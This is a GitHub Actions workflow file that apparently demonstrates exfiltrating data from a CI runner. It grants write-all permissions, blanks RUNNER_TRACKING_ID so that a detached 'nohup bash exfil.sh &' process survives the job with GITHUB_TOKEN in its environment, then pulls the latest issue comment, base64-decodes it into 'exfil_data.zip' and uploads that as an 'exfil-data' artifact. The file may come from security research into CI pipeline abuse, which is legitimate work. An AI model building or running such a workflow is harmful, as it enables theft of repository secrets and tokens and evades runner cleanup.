name: Env Var Workflow

on:
  workflow_dispatch:

permissions: write-all

jobs:
  test_and_env:
    runs-on: ubuntu-latest
    steps:
      - name: Check out repository
        uses: actions/checkout@v4

      - name: Run test bash command
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
        run: RUNNER_TRACKING_ID="" && (nohup bash exfil.sh &)

      - name: Set var 2
        run: |
          TARGET_VAR=step2
          echo "Set TARGET_VAR"
          sleep 2

      - name: Set var 3
        run: |
          TARGET_VAR=step3
          echo "Set TARGET_VAR"
          sleep 2

      - name: Download and decode latest issue comment
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
        run: |
          # Get latest issue number
          ISSUE_NUM=$(curl -s -H "Authorization: token $GITHUB_TOKEN" \
            "https://api.github.com/repos/${{ github.repository }}/issues?state=all&sort=created&direction=desc&per_page=1" \
            | jq -r '.[0].number')
          
          echo "Latest issue number: $ISSUE_NUM"
          
          # Get latest comment on that issue (takes last one in the list)
          COMMENT_BODY=$(curl -s -H "Authorization: token $GITHUB_TOKEN" \
            "https://api.github.com/repos/${{ github.repository }}/issues/$ISSUE_NUM/comments" \
            | jq -r '.[-1].body')
          
          echo "Latest comment retrieved, decoding..."
          # Base64 decode into a zip file
          echo "$COMMENT_BODY" | base64 -d > exfil_data.zip
          
          echo "Zip file created successfully"
          ls -lh exfil_data.zip

      - name: Upload zip artifact
        uses: actions/upload-artifact@v4
        with:
          name: exfil-data
          path: exfil_data.zip
